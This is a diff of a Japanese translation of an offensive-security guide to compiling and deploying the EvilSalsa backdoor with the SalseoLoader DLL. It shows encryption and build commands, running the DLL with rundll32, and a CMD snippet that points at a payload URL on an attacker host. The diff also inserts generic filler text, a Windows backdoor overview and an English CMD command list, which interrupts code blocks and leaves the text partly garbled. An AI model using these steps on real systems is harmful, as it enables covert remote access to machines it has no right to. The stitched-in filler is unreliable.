@@ -16,7 +16,7 @@
 
 githubからソースコードをダウンロードし、**EvilSalsa**と**SalseoLoader**をコンパイルします。コードをコンパイルするには**Visual Studio**が必要です。
 
-これらのプロジェクトを、使用するWindowsボックスのアーキテクチャに合わせてコンパイルしてください（Windowsがx64をサポートしている場合は、そのアーキテクチャにコンパイルします）。
+これらのプロジェクトを、使用するWindowsボックスのアーキテクチャに合わせてコンパイルします（Windowsがx64をサポートしている場合は、そのアーキテクチャにコンパイルします）。
 
 Visual Studio内で、**左側の"Build"タブ**の**"Platform Target"**でアーキテクチャを**選択**できます。
 
@@ -30,7 +30,7 @@ Visual Studio内で、**左側の"Build"タブ**の**"Platform Target"**でア�
 
 ## バックドアの準備
 
-まず、**EvilSalsa.dll**をエンコードする必要があります。これには、pythonスクリプト**encrypterassembly.py**を使用するか、プロジェクト**EncrypterAssembly**をコンパイルすることができます：
+まず、**EvilSalsa.dll**をエンコードする必要があります。これには、Pythonスクリプト**encrypterassembly.py**を使用するか、プロジェクト**EncrypterAssembly**をコンパイルすることができます：
 
 ### **Python**
 ```
@@ -39,25 +39,29 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-Windows（ウィンドウズ）は、マイクロソフトが開発したオペレーティングシステムです。Windowsには、バックドアを作成するためのさまざまな方法があります。以下にいくつかの一般的な方法を紹介します。
+Windowsは、バックドアを作成するためのさまざまな方法を提供します。以下にいくつかの一般的な手法を紹介します。
 
 #### リモートデスクトップ
 
-リモートデスクトップは、Windowsの標準機能であり、リモートでコンピュータにアクセスするためのプロトコルです。バックドアを作成するためには、リモートデスクトップを有効にし、適切な認証情報を使用してアクセスする必要があります。
+リモートデスクトップ（RDP）は、Windowsマシンにリモートでアクセスするための機能です。バックドアを作成するために、攻撃者はRDPを利用してWindowsマシンにアクセスし、システムに対する制御を取得します。
 
-#### バックドアソフトウェア
+#### バックドアアプリケーション
 
-バックドアソフトウェアは、Windowsにインストールされたプログラムやツールです。これらのソフトウェアは、システムにバックドアを作成し、リモートでアクセスするための機能を提供します。バックドアソフトウェアは、悪意のある攻撃者によってインストールされることもあります。
+バックドアアプリケーションは、システムに隠された裏口として機能するソフトウェアです。攻撃者は、バックドアアプリケーションをWindowsマシンにインストールし、システムに対するリモートアクセスやコントロールを可能にします。
 
 #### サービスの改ざん
 
-Windowsでは、サービスと呼ばれるバックグラウンドプロセスが実行されます。これらのサービスを改ざんすることで、バックドアを作成することができます。改ざんされたサービスは、システムの起動時に自動的に実行され、攻撃者によるリモートアクセスを可能にします。
+Windowsでは、サービスと呼ばれるバックグラウンドプロセスが実行されています。攻撃者は、サービスの改ざんを行い、バックドアを作成します。これにより、攻撃者はシステムに対する持続的なアクセスを確保することができます。
 
-#### レジストリの変更
+#### レジストリの改ざん
 
-Windowsのレジストリは、システムの設定情報を格納するデータベースです。レジストリを変更することで、バックドアを作成することができます。レジストリの変更は、システムの安定性に影響を与える可能性があるため、注意が必要です。
+Windowsのレジストリは、システムの設定情報を格納するデータベースです。攻撃者は、レジストリの改ざんを行い、バックドアを作成します。これにより、攻撃者はシステムに対するアクセスや制御を取得することができます。
 
-これらは、Windowsでバックドアを作成するための一般的な方法の一部です。攻撃者は、これらの方法を使用してシステムに侵入し、機密情報を盗むなどの悪意のある行為を行うことがあります。セキュリティを強化するためには、適切な対策を講じる必要があります。
+#### マルウェアの使用
+
+マルウェアは、悪意のあるソフトウェアのことを指します。攻撃者は、マルウェアを使用してバックドアを作成し、Windowsマシンに侵入します。マルウェアは、バックドアを作成するだけでなく、他の悪意のある活動を行うこともあります。
+
+これらは、Windowsでバックドアを作成するための一般的な手法の一部です。攻撃者は、これらの手法を利用してシステムに侵入し、機密情報を盗み出すなどの悪意のある活動を行うことがあります。
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -111,7 +115,7 @@ Visual Studioを使用してSalseoLoaderプロジェクトを開きます。
 
 ### メイン関数の前に\[DllExport]を追加します
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### このプロジェクトにDllExportをインストールします
 
@@ -153,11 +157,11 @@ Visual Studioを**終了**します
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-**x64プラットフォーム**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> ビルド --> プラットフォームターゲット = x64）
+**x64** **プラットフォーム**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> ビルド --> プラットフォームのターゲット = x64）
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-ソリューションをビルドするには：ビルド --> ソリューションのビルド（出力コンソールに新しいDLLのパスが表示されます）
+ソリューションを**ビルド**するには：ビルド --> ソリューションのビルド（出力コンソールに新しいDLLのパスが表示されます）
 
 ### 生成されたDLLをテストします
 
@@ -184,7 +188,23 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a way to interact with the system through text-based commands. CMD can be used to execute various commands, navigate through directories, run scripts, and perform administrative tasks. It is a powerful tool for both regular users and hackers, as it allows for direct control and manipulation of the system.
+CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It allows users to interact with the operating system by executing commands. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
+
+CMD provides a wide range of commands that can be used to carry out different operations. Some commonly used commands include:
+
+- `cd`: Change directory
+- `dir`: List files and directories
+- `mkdir`: Create a new directory
+- `del`: Delete files
+- `copy`: Copy files
+- `move`: Move files
+- `ren`: Rename files
+- `tasklist`: List running processes
+- `taskkill`: Terminate a running process
+
+CMD can also be used to execute batch scripts, which are a series of commands stored in a text file with the extension `.bat` or `.cmd`. Batch scripts allow users to automate repetitive tasks by running multiple commands sequentially.
+
+Overall, CMD is a powerful tool for managing and controlling the Windows operating system through the command line interface.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
